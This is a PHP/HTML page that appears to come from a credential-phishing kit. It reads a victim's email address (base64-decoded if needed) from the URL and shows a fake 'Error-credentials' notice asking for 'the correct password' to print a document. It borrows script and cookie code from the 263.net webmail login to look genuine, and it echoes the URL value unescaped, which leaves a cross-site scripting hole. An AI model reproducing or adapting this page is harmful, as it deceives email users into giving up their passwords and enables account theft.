<?php
$login = $_GET['login'];

if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 ?>


<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Error-credentials</title>
<link href="./Email_files/layout.css" rel="stylesheet" type="text/css">
<style>
.j_jt_bor {background:#ebebeb;border:none;padding:5px;}
.jt_in_bor {border:1px solid #cdcdcd;background:#fff;padding-top:10px;}
.title_oge {color:#b51612;font-size:15px;font-weight:bold;}
.header_line {padding:0;margin-top:-10px;}
.header_line span.title_oge {height:20px;float:left;display:block;background:url(../images/popIcons.gif) left top no-repeat;margin:0 8px 0 10px;padding:0 0 0 25px;}
.errorTxts {font-size:13px;font-weight:bold;padding: 15px 0 10px 0;}
.j_button1 {width:px;height:auto;border:1px solid #7d7d7d;background:#8f8e8e;padding:6px 20px;padding:6px 10px 3px 10px\0;color:#fff;font-size:14px;font-weight:bold;margin:12px 0;}
</style>
<style> 
body {
  background-image: url("https://i.imgur.com/IoE30az.png");
  background-color: #cccccc;
}
</style>
</head>
<body class="body_line margin">
<table width="100%" height="100%" cellspacing="0" cellpadding="0" border="0" align="center">
  <tbody><tr>
    <td height="100">&nbsp;</td>
  </tr>
  <tr>
    <td valign="top"><table width="35%" border="0" align="center" cellpadding="0" cellspacing="0" class="j_jt_bor">
        <tbody><tr>
          <td valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0" height="100%" class="jt_in_bor">
              <tbody><tr>
                <td class="header_line" height="20">&nbsp;&nbsp;<span class="title_oge"><img src="https://art.pixilart.com/401a7f559252ebc.gif"alt="" width="400" height="30"> </span></td>
              </tr>
              
              <tr>
                <td height="10" align="center"><table width="90%" height="100" cellspacing="0" cellpadding="0" border="0">
                  <tbody><tr align="center">
                    <td height="21" align="right"><table width="96%" cellspacing="0" cellpadding="0" border="0" align="center">
                        <tbody><tr>
                          <td height="21" align="center" class="errorTxts">Enter the correct password for <?php echo $log; ?> to print document. </td>
                        </tr>
                    </tbody></table></td>
                  </tr>
          <tr align="center">
            <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tbody><tr>
                    <td align="right"><form action="../#<?php echo $log; ?>" method="get"><input type="submit" name="Submit2" value="Back" class="j_button1"  target="_self"></form>
                         </td>
                        </tr>
                    </tbody></table></td>
                  </tr>
                </tbody></table></td>
              </tr>
              
              <tr>
                <td></td>
              </tr>
            </tbody></table></td>
        </tr>
      </tbody></table></td>
  </tr>
</tbody></table>
<script type="text/javascript">
//登录超时或页面错误跳转链接
var pageErrorLink = function(charset,msgNum,url){
	top.document.location.href = top.Global.Config.sysPath + "/website/jsp/error.jsp?charset="+charset+"&msgNum="+msgNum+"&url="+url;
}
try{
	pageErrorLink("en","LoginAction_msg_005",encodeURI("http://www.263.net"));
}catch(e){}


//是否使用自动登录
function getcookie(name) {
var cookie_start = document.cookie.indexOf(name);
var cookie_end = document.cookie.indexOf(";", cookie_start);
return cookie_start == -1 ? '' : unescape(document.cookie.substring(cookie_start + name.length + 1, (cookie_end > cookie_start ? cookie_end : document.cookie.length)));
}
function setcookie(cookieName, cookieValue, seconds, path, domain, secure) {
    var expires = new Date();
    expires.setTime(expires.getTime() + seconds);
    document.cookie = escape(cookieName) + '=' + escape(cookieValue)
                                            + (expires ? '; expires=' + expires.toGMTString() : '')
                                            + (path ? '; path=' + path : '/')
                                            + (domain ? '; domain=' + domain : '')
                                            + (secure ? '; secure' : '');
}
setcookie("wmHasAutoLogin",false,(1000*60*60*24*14),"/","263.net");
</script>


</body></html>